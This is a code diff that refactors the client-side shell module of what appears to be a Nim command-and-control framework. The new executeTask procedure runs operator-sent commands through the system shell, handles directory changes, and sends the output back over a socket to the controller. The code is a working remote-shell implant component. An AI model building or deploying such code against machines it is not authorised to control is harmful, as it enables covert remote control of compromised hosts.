@@ -1,25 +1,26 @@
-when defined(server):
-  import asyncdispatch, json
-  import ../server/[types, communication]
+import osproc, os, net, strutils, json
+import ../client/communication
 
-when defined(client):
-  import osproc, os, net, strutils
-  import ../client/communication
-
-when defined(server):
-  proc sendTask*(client: C2Client, cmd: string): Future[Task] {.async.} =
-    return await client.sendClientTask("shell", %*{ "shellCmd": cmd })
-
-when defined(client):
-  proc executeTask*(socket: Socket, taskId: int, toExec: string) =
-    try:
-      let cmdSplit = toExec.split(" ") 
-      if cmdSplit[0] == "cd":
-        let newPath = cmdSplit[1..(cmdSplit.len() - 1)].join(" ")
-        setCurrentDir(newPath)
-        socket.sendOutput(taskId, "SHELL", "changed current working directory to " & newPath)
-        return
-      let (output, _) = execCmdEx(toExec, workingDir = getCurrentDir(), options={poUsePath, poStdErrToStdOut, poEvalCommand, poDaemon})
-      socket.sendOutput(taskId, "SHELL", output)
-    except OSError:
-      socket.sendOutput(taskId, "SHELL", "", getCurrentExceptionMsg())
+proc executeTask*(socket: net.Socket, taskId: int, params: seq[string]) =
+  let toExec = params[0]
+  let taskOutput = TaskOutput(
+    task: "output",
+    taskId: taskId,
+    error: "",
+    data: %*{}
+  )
+  
+  try:
+    let cmdSplit = toExec.split(" ")
+    if cmdSplit[0] == "cd":
+      let newPath = cmdSplit[1..(cmdSplit.len() - 1)].join(" ")
+      setCurrentDir(newPath)
+      taskOutput.addData(Text, "result", "changed current working directory to " & newPath)
+      socket.sendOutput(taskOutput)
+      return
+    let (output, _) = execCmdEx(toExec, workingDir = getCurrentDir(), options={poUsePath, poStdErrToStdOut, poEvalCommand, poDaemon})
+    taskOutput.addData(Text, "result", output)
+    socket.sendOutput(taskOutput)
+  except OSError:
+    taskOutput.error = getCurrentExceptionMsg()
+    socket.sendOutput(taskOutput)
